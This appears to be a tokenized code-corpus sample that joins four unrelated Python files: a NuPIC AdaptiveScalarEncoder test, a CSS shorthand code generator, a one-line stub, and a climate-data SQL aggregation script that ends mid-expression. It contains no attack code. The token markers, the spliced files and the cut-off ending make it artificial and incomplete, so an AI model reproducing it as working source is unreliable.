 # !/usr/bin/env ▁ python <encdom>  # ▁ Numenta ▁ Platform ▁ for ▁ Intelligent ▁ Computing ▁ (NuPIC) <encdom>  # ▁ Copyright ▁ (C) ▁ 2013, ▁ Numenta, ▁ Inc. ▁ Unless ▁ you ▁ have ▁ an ▁ agreement <encdom>  # ▁ with ▁ Numenta, ▁ Inc., ▁ for ▁ a ▁ separate ▁ license ▁ for ▁ this ▁ software ▁ code, ▁ the <encdom>  # ▁ following ▁ terms ▁ and ▁ conditions ▁ apply: <encdom>  # ▁ This ▁ program ▁ is ▁ free ▁ software: ▁ you ▁ can ▁ redistribute ▁ it ▁ and/or ▁ modify <encdom>  # ▁ it ▁ under ▁ the ▁ terms ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ version ▁ 3 ▁ as <encdom>  # ▁ published ▁ by ▁ the ▁ Free ▁ Software ▁ Foundation. <encdom>  # ▁ This ▁ program ▁ is ▁ distributed ▁ in ▁ the ▁ hope ▁ that ▁ it ▁ will ▁ be ▁ useful, <encdom>  # ▁ but ▁ WITHOUT ▁ ANY ▁ WARRANTY; ▁ without ▁ even ▁ the ▁ implied ▁ warranty ▁ of <encdom>  # ▁ MERCHANTABILITY ▁ or ▁ FITNESS ▁ FOR ▁ A ▁ PARTICULAR ▁ PURPOSE. <encdom>  # ▁ See ▁ the ▁ GNU ▁ General ▁ Public ▁ License ▁ for ▁ more ▁ details. <encdom>  # ▁ You ▁ should ▁ have ▁ received ▁ a ▁ copy ▁ of ▁ the ▁ GNU ▁ General ▁ Public ▁ License <encdom>  # ▁ along ▁ with ▁ this ▁ program. ▁ If ▁ not, ▁ see ▁ http://www.gnu.org/licenses. <encdom>  # ▁ http://numenta.org/licenses/ <encdom> import tempfile <newline> import unittest2 as unittest <newline> from nupic . encoders . base import defaultDtype <newline> from nupic . data import SENTINEL_VALUE_FOR_MISSING_DATA <newline> import numpy <newline> from nupic . encoders . adaptivescalar import AdaptiveScalarEncoder <newline> from nupic . encoders . adaptivescalar_capnp import AdaptiveScalarEncoderProto <newline> class AdaptiveScalarTest ( unittest . TestCase ) : <newline> <indent>  """ Tests ▁ for ▁ AdaptiveScalarEncoder """  <newline> def setUp ( self ) : <newline>  # ▁ forced: ▁ it's ▁ strongly ▁ recommended ▁ to ▁ use ▁ w>=21, ▁ in ▁ the ▁ example ▁ we ▁ force <encdom>  # ▁ skip ▁ the ▁ check ▁ for ▁ readibility <encdom> <indent> self . _l = AdaptiveScalarEncoder ( name = "scalar" , n = 14 , w = 5 , minval = 1 , maxval = 10 , periodic = False , forced = True ) <newline> <dedent> def testMissingValues ( self ) : <newline> <indent>  """ missing ▁ values """  <newline>  # ▁ forced: ▁ it's ▁ strongly ▁ recommended ▁ to ▁ use ▁ w>=21, ▁ in ▁ the ▁ example ▁ we ▁ force <encdom>  # ▁ skip ▁ the ▁ check ▁ for ▁ readib. <encdom> mv = AdaptiveScalarEncoder ( name = "mv" , n = 14 , w = 3 , minval = 1 , maxval = 8 , periodic = False , forced = True ) <newline> empty = mv . encode ( SENTINEL_VALUE_FOR_MISSING_DATA ) <newline> self . assertEqual ( empty . sum ( ) , 0 ) <newline> <dedent> def testNonPeriodicEncoderMinMaxSpec ( self ) : <newline> <indent>  """ Non-periodic ▁ encoder, ▁ min ▁ and ▁ max ▁ specified """  <newline> self . assertTrue ( numpy . array_equal ( self . _l . encode ( 1 ) , numpy . array ( [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , dtype = defaultDtype ) ) ) <newline> self . assertTrue ( numpy . array_equal ( self . _l . encode ( 2 ) , numpy . array ( [ 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , dtype = defaultDtype ) ) ) <newline> self . assertTrue ( numpy . array_equal ( self . _l . encode ( 10 ) , numpy . array ( [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] , dtype = defaultDtype ) ) ) <newline> <dedent> def testTopDownDecode ( self ) : <newline> <indent>  """ Test ▁ the ▁ input ▁ description ▁ generation ▁ and ▁ topDown ▁ decoding """  <newline> l = self . _l <newline> v = l . minval <newline> while v < l . maxval : <newline> <indent> output = l . encode ( v ) <newline> decoded = l . decode ( output ) <newline> ( fieldsDict , _ ) = decoded <newline> self . assertEqual ( len ( fieldsDict ) , 1 ) <newline> ( ranges , _ ) = fieldsDict . values ( ) [ 0 ] <newline> self . assertEqual ( len ( ranges ) , 1 ) <newline> ( rangeMin , rangeMax ) = ranges [ 0 ] <newline> self . assertEqual ( rangeMin , rangeMax ) <newline> self . assertLess ( abs ( rangeMin - v ) , l . resolution ) <newline> topDown = l . topDownCompute ( output ) [ 0 ] <newline> self . assertLessEqual ( abs ( topDown . value - v ) , l . resolution ) <newline>  # ▁ Test ▁ bucket ▁ support <encdom> bucketIndices = l . getBucketIndices ( v ) <newline> topDown = l . getBucketInfo ( bucketIndices ) [ 0 ] <newline> self . assertLessEqual ( abs ( topDown . value - v ) , l . resolution / 2 ) <newline> self . assertEqual ( topDown . value , l . getBucketValues ( ) [ bucketIndices [ 0 ] ] ) <newline> self . assertEqual ( topDown . scalar , topDown . value ) <newline> self . assertTrue ( numpy . array_equal ( topDown . encoding , output ) ) <newline>  # ▁ Next ▁ value <encdom> v += l . resolution / 4 <newline> <dedent> <dedent> def testFillHoles ( self ) : <newline> <indent>  """ Make ▁ sure ▁ we ▁ can ▁ fill ▁ in ▁ holes """  <newline> l = self . _l <newline> decoded = l . decode ( numpy . array ( [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 0 , 0 , 1 , 1 ] ) ) <newline> ( fieldsDict , _ ) = decoded <newline> self . assertEqual ( len ( fieldsDict ) , 1 ) <newline> ( ranges , _ ) = fieldsDict . values ( ) [ 0 ] <newline> self . assertEqual ( len ( ranges ) , 1 ) <newline> self . assertSequenceEqual ( ranges [ 0 ] , [ 10 , 10 ] ) <newline> decoded = l . decode ( numpy . array ( [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 0 , 0 , 1 ] ) ) <newline> ( fieldsDict , _ ) = decoded <newline> self . assertEqual ( len ( fieldsDict ) , 1 ) <newline> ( ranges , _ ) = fieldsDict . values ( ) [ 0 ] <newline> self . assertEqual ( len ( ranges ) , 1 ) <newline> self . assertSequenceEqual ( ranges [ 0 ] , [ 10 , 10 ] ) <newline> <dedent> def testNonPeriodicEncoderMinMaxNotSpec ( self ) : <newline> <indent>  """ Non-periodic ▁ encoder, ▁ min ▁ and ▁ max ▁ not ▁ specified """  <newline> l = AdaptiveScalarEncoder ( name = "scalar" , n = 14 , w = 5 , minval = None , maxval = None , periodic = False , forced = True ) <newline> def _verify ( v , encoded , expV = None ) : <newline> <indent> if expV is None : <newline> <indent> expV = v <newline> <dedent> self . assertTrue ( numpy . array_equal ( l . encode ( v ) , numpy . array ( encoded , dtype = defaultDtype ) ) ) <newline> self . assertLessEqual ( abs ( l . getBucketInfo ( l . getBucketIndices ( v ) ) [ 0 ] . value - expV ) , l . resolution / 2 ) <newline> <dedent> def _verifyNot ( v , encoded ) : <newline> <indent> self . assertFalse ( numpy . array_equal ( l . encode ( v ) , numpy . array ( encoded , dtype = defaultDtype ) ) ) <newline> <dedent> _verify ( 1 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( 2 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 10 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 3 , [ 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( - 9 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( - 8 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( - 7 , [ 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( - 6 , [ 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( - 5 , [ 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( 0 , [ 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( 8 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 ] ) <newline> _verify ( 8 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 ] ) <newline> _verify ( 10 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 11 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 12 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 13 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 14 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 15 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline>  # """ Test ▁ switching ▁ learning ▁ off """ <encdom> l = AdaptiveScalarEncoder ( name = "scalar" , n = 14 , w = 5 , minval = 1 , maxval = 10 , periodic = False , forced = True ) <newline> _verify ( 1 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verify ( 10 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 20 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( 10 , [ 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 ] ) <newline> l . setLearning ( False ) <newline> _verify ( 30 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] , expV = 20 ) <newline> _verify ( 20 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( - 10 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , expV = 1 ) <newline> _verify ( - 1 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] , expV = 1 ) <newline> l . setLearning ( True ) <newline> _verify ( 30 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verifyNot ( 20 , [ 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 1 , 1 , 1 , 1 , 1 ] ) <newline> _verify ( - 10 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> _verifyNot ( - 1 , [ 1 , 1 , 1 , 1 , 1 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 , 0 ] ) <newline> <dedent> def testSetFieldStats ( self ) : <newline> <indent>  """ Test ▁ setting ▁ the ▁ min ▁ and ▁ max ▁ using ▁ setFieldStats """  <newline> def _dumpParams ( enc ) : <newline> <indent> return ( enc . n , enc . w , enc . minval , enc . maxval , enc . resolution , enc . _learningEnabled , enc . recordNum , enc . radius , enc . rangeInternal , enc . padding , enc . nInternal ) <newline> <dedent> sfs = AdaptiveScalarEncoder ( name = 'scalar' , n = 14 , w = 5 , minval = 1 , maxval = 10 , periodic = False , forced = True ) <newline> reg = AdaptiveScalarEncoder ( name = 'scalar' , n = 14 , w = 5 , minval = 1 , maxval = 100 , periodic = False , forced = True ) <newline> self . assertNotEqual ( _dumpParams ( sfs ) , _dumpParams ( reg ) , ( "Params ▁ should ▁ not ▁ be ▁ equal, ▁ since ▁ the ▁ two ▁ encoders ▁ " "were ▁ instantiated ▁ with ▁ different ▁ values." ) ) <newline>  # ▁ set ▁ the ▁ min ▁ and ▁ the ▁ max ▁ using ▁ sFS ▁ to ▁ 1,100 ▁ respectively. <encdom> sfs . setFieldStats ( "this" , { "this" : { "min" : 1 , "max" : 100 } } ) <newline>  # Now ▁ the ▁ parameters ▁ for ▁ both ▁ should ▁ be ▁ the ▁ same <encdom> self . assertEqual ( _dumpParams ( sfs ) , _dumpParams ( reg ) , ( "Params ▁ should ▁ now ▁ be ▁ equal, ▁ but ▁ they ▁ are ▁ not. ▁ sFS ▁ " "should ▁ be ▁ equivalent ▁ to ▁ initialization." ) ) <newline> <dedent> def testReadWrite ( self ) : <newline> <indent> originalValue = self . _l . encode ( 1 ) <newline> proto1 = AdaptiveScalarEncoderProto . new_message ( ) <newline> self . _l . write ( proto1 ) <newline>  # ▁ Write ▁ the ▁ proto ▁ to ▁ a ▁ temp ▁ file ▁ and ▁ read ▁ it ▁ back ▁ into ▁ a ▁ new ▁ proto <encdom> with tempfile . TemporaryFile ( ) as f : <newline> <indent> proto1 . write ( f ) <newline> f . seek ( 0 ) <newline> proto2 = AdaptiveScalarEncoderProto . read ( f ) <newline> <dedent> encoder = AdaptiveScalarEncoder . read ( proto2 ) <newline> self . assertIsInstance ( encoder , AdaptiveScalarEncoder ) <newline> self . assertEqual ( encoder . recordNum , self . _l . recordNum ) <newline> self . assertDictEqual ( encoder . slidingWindow . __dict__ , self . _l . slidingWindow . __dict__ ) <newline> self . assertEqual ( encoder . w , self . _l . w ) <newline> self . assertEqual ( encoder . minval , self . _l . minval ) <newline> self . assertEqual ( encoder . maxval , self . _l . maxval ) <newline> self . assertEqual ( encoder . periodic , self . _l . periodic ) <newline> self . assertEqual ( encoder . n , self . _l . n ) <newline> self . assertEqual ( encoder . radius , self . _l . radius ) <newline> self . assertEqual ( encoder . resolution , self . _l . resolution ) <newline> self . assertEqual ( encoder . name , self . _l . name ) <newline> self . assertEqual ( encoder . verbosity , self . _l . verbosity ) <newline> self . assertEqual ( encoder . clipInput , self . _l . clipInput ) <newline> self . assertTrue ( numpy . array_equal ( encoder . encode ( 1 ) , originalValue ) ) <newline> self . assertEqual ( self . _l . decode ( encoder . encode ( 1 ) ) , encoder . decode ( self . _l . encode ( 1 ) ) ) <newline>  # ▁ Feed ▁ in ▁ a ▁ new ▁ value ▁ and ▁ ensure ▁ the ▁ encodings ▁ match <encdom> result1 = self . _l . encode ( 7 ) <newline> result2 = encoder . encode ( 7 ) <newline> self . assertTrue ( numpy . array_equal ( result1 , result2 ) ) <newline> <dedent> <dedent> if __name__ == '__main__' : <newline> <indent> unittest . main ( ) <newline> <dedent>
 # !/usr/bin/env ▁ python <encdom>  # ▁ Copyright ▁ (C) ▁ 2013 ▁ Intel ▁ Corporation. ▁ All ▁ rights ▁ reserved. <encdom>  # ▁ Redistribution ▁ and ▁ use ▁ in ▁ source ▁ and ▁ binary ▁ forms, ▁ with ▁ or ▁ without <encdom>  # ▁ modification, ▁ are ▁ permitted ▁ provided ▁ that ▁ the ▁ following ▁ conditions ▁ are <encdom>  # ▁ met: <encdom>  # ▁ * ▁ Redistributions ▁ of ▁ source ▁ code ▁ must ▁ retain ▁ the ▁ above ▁ copyright <encdom>  # ▁ notice, ▁ this ▁ list ▁ of ▁ conditions ▁ and ▁ the ▁ following ▁ disclaimer. <encdom>  # ▁ * ▁ Redistributions ▁ in ▁ binary ▁ form ▁ must ▁ reproduce ▁ the ▁ above <encdom>  # ▁ copyright ▁ notice, ▁ this ▁ list ▁ of ▁ conditions ▁ and ▁ the ▁ following ▁ disclaimer <encdom>  # ▁ in ▁ the ▁ documentation ▁ and/or ▁ other ▁ materials ▁ provided ▁ with ▁ the <encdom>  # ▁ distribution. <encdom>  # ▁ * ▁ Neither ▁ the ▁ name ▁ of ▁ Google ▁ Inc. ▁ nor ▁ the ▁ names ▁ of ▁ its <encdom>  # ▁ contributors ▁ may ▁ be ▁ used ▁ to ▁ endorse ▁ or ▁ promote ▁ products ▁ derived ▁ from <encdom>  # ▁ this ▁ software ▁ without ▁ specific ▁ prior ▁ written ▁ permission. <encdom>  # ▁ THIS ▁ SOFTWARE ▁ IS ▁ PROVIDED ▁ BY ▁ THE ▁ COPYRIGHT ▁ HOLDERS ▁ AND ▁ CONTRIBUTORS <encdom>  # ▁"AS ▁ IS" ▁ AND ▁ ANY ▁ EXPRESS ▁ OR ▁ IMPLIED ▁ WARRANTIES, ▁ INCLUDING, ▁ BUT ▁ NOT <encdom>  # ▁ LIMITED ▁ TO, ▁ THE ▁ IMPLIED ▁ WARRANTIES ▁ OF ▁ MERCHANTABILITY ▁ AND ▁ FITNESS ▁ FOR <encdom>  # ▁ A ▁ PARTICULAR ▁ PURPOSE ▁ ARE ▁ DISCLAIMED. ▁ IN ▁ NO ▁ EVENT ▁ SHALL ▁ THE ▁ COPYRIGHT <encdom>  # ▁ OWNER ▁ OR ▁ CONTRIBUTORS ▁ BE ▁ LIABLE ▁ FOR ▁ ANY ▁ DIRECT, ▁ INDIRECT, ▁ INCIDENTAL, <encdom>  # ▁ SPECIAL, ▁ EXEMPLARY, ▁ OR ▁ CONSEQUENTIAL ▁ DAMAGES ▁ (INCLUDING, ▁ BUT ▁ NOT <encdom>  # ▁ LIMITED ▁ TO, ▁ PROCUREMENT ▁ OF ▁ SUBSTITUTE ▁ GOODS ▁ OR ▁ SERVICES; ▁ LOSS ▁ OF ▁ USE, <encdom>  # ▁ DATA, ▁ OR ▁ PROFITS; ▁ OR ▁ BUSINESS ▁ INTERRUPTION) ▁ HOWEVER ▁ CAUSED ▁ AND ▁ ON ▁ ANY <encdom>  # ▁ THEORY ▁ OF ▁ LIABILITY, ▁ WHETHER ▁ IN ▁ CONTRACT, ▁ STRICT ▁ LIABILITY, ▁ OR ▁ TORT <encdom>  # ▁ (INCLUDING ▁ NEGLIGENCE ▁ OR ▁ OTHERWISE) ▁ ARISING ▁ IN ▁ ANY ▁ WAY ▁ OUT ▁ OF ▁ THE ▁ USE <encdom>  # ▁ OF ▁ THIS ▁ SOFTWARE, ▁ EVEN ▁ IF ▁ ADVISED ▁ OF ▁ THE ▁ POSSIBILITY ▁ OF ▁ SUCH ▁ DAMAGE. <encdom> from collections import defaultdict <newline> import sys <newline> import css_properties <newline> import in_generator <newline> from name_utilities import lower_first <newline> import template_expander <newline> class StylePropertyShorthandWriter ( css_properties . CSSProperties ) : <newline> <indent> class_name = 'StylePropertyShorthand' <newline> def __init__ ( self , in_file_path ) : <newline> <indent> super ( StylePropertyShorthandWriter , self ) . __init__ ( in_file_path ) <newline> self . _outputs = { ( 'StylePropertyShorthand.cpp' ) : self . generate_style_property_shorthand_cpp , ( 'StylePropertyShorthand.h' ) : self . generate_style_property_shorthand_h } <newline> self . _longhand_dictionary = defaultdict ( list ) <newline> self . _properties = { property_id : property for property_id , property in self . _properties . items ( ) if property [ 'longhands' ] } <newline> for property in self . _properties . values ( ) : <newline> <indent> property [ 'longhand_property_ids' ] = map ( css_properties . css_name_to_enum , property [ 'longhands' ] . split ( ';' ) ) <newline> for longhand in property [ 'longhand_property_ids' ] : <newline> <indent> self . _longhand_dictionary [ longhand ] . append ( property ) <newline> <dedent> <dedent> <dedent> @ template_expander . use_jinja ( 'StylePropertyShorthand.cpp.tmpl' ) <newline> def generate_style_property_shorthand_cpp ( self ) : <newline> <indent> return { 'properties' : self . _properties , 'longhands_dictionary' : self . _longhand_dictionary , } <newline> <dedent> @ template_expander . use_jinja ( 'StylePropertyShorthand.h.tmpl' ) <newline> def generate_style_property_shorthand_h ( self ) : <newline> <indent> return { 'properties' : self . _properties , } <newline> <dedent> <dedent> if __name__ == '__main__' : <newline> <indent> in_generator . Maker ( StylePropertyShorthandWriter ) . main ( sys . argv ) <newline> <dedent>
 # ▁ -*- ▁ coding: ▁ utf-8 ▁ -*- <encdom> def social_sniff ( entity , argument ) : <newline> <indent> return True <newline>  # - ▁ Fine ▁ Funzione ▁ - <encdom> <dedent>
 # !/usr/bin/python <encdom>  # ▁ this ▁ will ▁ be ▁ used ▁ for ▁ aggregating ▁ data. <encdom>  # ▁ essentially ▁ need ▁ to: <encdom>  # ▁ create ▁ the ▁ table ▁ as ▁ with ▁ add_table.py <encdom>  # ▁ execute ▁ some ▁ SQL ▁ to ▁ fill ▁ it <encdom>  # ▁ e.g. ▁ add_monthly_aggregation_table.py ▁ Maximum ▁"Rainfall ▁ mm" ▁"float" <encdom>  # ▁ should ▁ this ▁ not ▁ be ▁ automatic ▁ on ▁ adding ▁ an ▁ observed ▁ data ▁ table? <encdom> import ClimateDataPortal <newline> def aggregate ( sample_table , Aggregation , db ) : <newline> <indent> aggregation_function = Aggregation . SQL_function <newline> aggregate_table = sample_table + "_monthly_" + aggregation_function <newline> sample_table_name = sample_table <newline> value_type = "real" <newline> create_table_sql =  """ <strnewline> ▁ ▁ ▁ ▁ DROP ▁ TABLE ▁ IF ▁ EXISTS ▁ %(aggregate_table)s; <strnewline> ▁ ▁ ▁ ▁ <strnewline> ▁ ▁ ▁ ▁ CREATE ▁ TABLE ▁ %(aggregate_table)s ▁ ( <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ place_id ▁ integer ▁ NOT ▁ NULL, <strnewline> ▁ ▁ ▁ ▁ ▁ ▁"month" ▁ smallint ▁ NOT ▁ NULL, <strnewline> ▁ ▁ ▁ ▁ ▁ ▁"value" ▁ real ▁ NOT ▁ NULL, <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ CONSTRAINT ▁ %(aggregate_table)s_primary_key ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ PRIMARY ▁ KEY ▁ (place_id, ▁ month), <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ CONSTRAINT ▁ %(aggregate_table)s_place_id_fkey ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ FOREIGN ▁ KEY ▁ (place_id) <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ REFERENCES ▁ climate_place ▁ (id) ▁ MATCH ▁ SIMPLE <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ON ▁ UPDATE ▁ NO ▁ ACTION ▁ ON ▁ DELETE ▁ CASCADE <strnewline> ▁ ▁ ▁ ▁ ); <strnewline> ▁ ▁ ▁ ▁ """  % locals ( ) <newline> db . executesql ( create_table_sql ) <newline>  # ▁ takes ▁ ~ ▁ 30 ▁ secs <encdom> year_dot_num = ClimateDataPortal . year_month_to_month_number ( 0 , 1 ) <newline> start_date_iso = ClimateDataPortal . start_date . isoformat ( ) <newline> table_name = sample_table <newline> aggregation_func = Aggregation . SQL_function <newline> insert_sql =  """ <strnewline> ▁ ▁ ▁ ▁ INSERT ▁ INTO ▁ %(aggregate_table)s ▁ (month, ▁ place_id, ▁ value) ▁ <strnewline> ▁ ▁ ▁ ▁ SELECT ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ( <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ %(year_dot_num)i ▁ + <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ (EXTRACT(year ▁ FROM ▁"subquery"."date") ▁ * ▁ 12) ▁ + <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ (EXTRACT(month ▁ FROM ▁"subquery"."date") ▁ - ▁ 1) <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ) ▁ as ▁ month, <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁"subquery"."place_id" ▁ as ▁ place_id, <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ COALESCE ▁ (%(aggregation_func)s("subquery"."value"), ▁ 0) ▁ as ▁ value <strnewline> ▁ ▁ ▁ ▁ FROM ▁ ( <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ SELECT ▁ <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ (date ▁'%(start_date_iso)s' ▁ + ▁ time_period) ▁ as ▁"date", <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ value, <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ place_id <strnewline> ▁ ▁ ▁ ▁ ▁ ▁ ▁ ▁ FROM ▁ %(table_name)s <strnewline> ▁ ▁ ▁ ▁ ) ▁ as ▁"subquery" <strnewline> ▁ ▁ ▁ ▁ GROUP ▁ BY ▁ month, ▁ place_id <strnewline> ▁ ▁ ▁ ▁ ; <strnewline> ▁ ▁ ▁ ▁ """  % locals ( ) <newline>  # print ▁ insert_sql <encdom> db . executesql ( insert_sql ) <newline>  """ <strnewline> ▁ update ▁"climate_sample_table_12_monthly_stddev" <strnewline> ▁ SET ▁ count ▁ = ▁ count.value <strnewline> ▁ FROM ▁ <strnewline> ▁"climate_sample_table_12_monthly_count" ▁ as ▁"count" <strnewline> ▁ WHERE ▁ <strnewline> ▁"count"."month" ▁ = ▁"climate_sample_table_12_monthly_stddev"."month" ▁ and <strnewline> ▁"count"."place_id" ▁ = ▁"climate_sample_table_12_monthly_stddev"."place_id" <strnewline> ▁ ; <strnewline> ▁ update ▁"climate_sample_table_12_monthly_stddev" <strnewline> ▁ SET ▁ mean ▁ = ▁ mean.value <strnewline> ▁ FROM ▁ <strnewline> ▁"climate_sample_table_12_monthly_avg" ▁ as ▁"mean" <strnewline> ▁ WHERE ▁ <strnewline> ▁"mean"."month" ▁ = ▁"climate_sample_table_12_monthly_stddev"."month" ▁ and <strnewline> ▁"mean"."place_id" ▁ = ▁"climate_sample_table_12_monthly_stddev"."place_id" <strnewline> ▁ ; <strnewline> ▁ <strnewline> ▁ select ▁ <strnewline> ▁"stddev"."place_id", <strnewline> ▁ sqrt( <strnewline> ▁ ( <strnewline> ▁ SUM(("stddev"."count" ▁ - ▁ 1) ▁ * ▁ ("stddev".value ▁ ^ ▁ 2)) <strnewline> ▁ + ▁ SUM("stddev"."count" ▁ * ▁ ("stddev"."mean" ▁ ^ ▁ 2)) <strnewline> ▁ - ▁ SUM("stddev"."count") ▁ * ▁ ( <strnewline> ▁ ( <strnewline> ▁ SUM("stddev"."count" ▁ * ▁"stddev"."mean") ▁ / ▁ SUM("stddev"."count") <strnewline> ▁ ) ▁ ^ ▁ 2 <strnewline> ▁ ) <strnewline> ▁ ) ▁ / ▁ (SUM("stddev"."count") ▁ - ▁ 1) <strnewline> ▁ ) <strnewline> ▁ FROM ▁ <strnewline> ▁"climate_sample_table_12_monthly_stddev" ▁ as ▁"stddev" <strnewline> ▁ GROUP ▁ BY <strnewline> ▁"stddev"."place_id" <strnewline> ▁ ; <strnewline> ▁ """  <newline> db . commit ( ) <newline> <dedent> from ClimateDataPortal . DSL import aggregations <newline> for sample_table in db ( db . climate_sample_table_spec ) . select ( ) : <newline> <indent> for Aggregation in aggregations : <newline>  # print ▁ sample_table.name, ▁ Aggregation.__name__ <encdom> <indent> aggregate ( ClimateDataPortal . sample_table_id ( sample_table . id ) , Aggregation , db ) <newline> <dedent> <dedent> def combine_stddev ( x , y , ddof = 1 ) : <newline>  # ▁ ddof ▁ = ▁ 1 ▁ matches ▁ postgres ▁ stddev <encdom> <indent> mu_x_u_y = ( 1.0 / ( x . count + y . count ) ) * ( ( x . count * x . mean ) + ( y . count * y . mean ) ) <newline> return math . sqrt ( ( 1.0 / ( x . count + y . count - ddof ) ) * ( ( ( x . count - ddof ) * ( x . stddev ** 2 ) ) + ( ( x . count * ( x . mean ** 2 ) ) ) + ( ( y . count - ddof ) * ( y . stddev ** 2 ) ) + ( ( y . count * ( y . mean ** 2 ) ) ) - ( ( x . count + y . count ) * ( mu_x_u_y ** 2 ) ) ) ) <newline> <dedent> def combine_stddev3 ( x , y , z , ddof = 1 ) : <newline>  # ▁ ddof ▁ = ▁ 1 ▁ matches ▁ postgres ▁ stddev <encdom> <indent> mu_x_u_y_u_z = ( 1.0 / ( x . count + y . count + z . count ) ) * ( ( x . count * x . mean ) + ( y . count * y . mean ) + ( z . count * z . mean ) ) <newline> return math . sqrt ( ( 1.0 / ( x . count + y . count + z . count - ddof ) ) * ( ( ( x . count - ddof ) * ( x . stddev ** 2 ) ) + ( ( y . count - ddof ) * ( y . stddev ** 2 ) ) + ( ( z . count - ddof ) * ( z . stddev ** 2 ) ) + ( ( z . count * ( z . mean ** 2 ) ) ) + ( ( y . count * ( y . mean ** 2 ) ) ) + ( 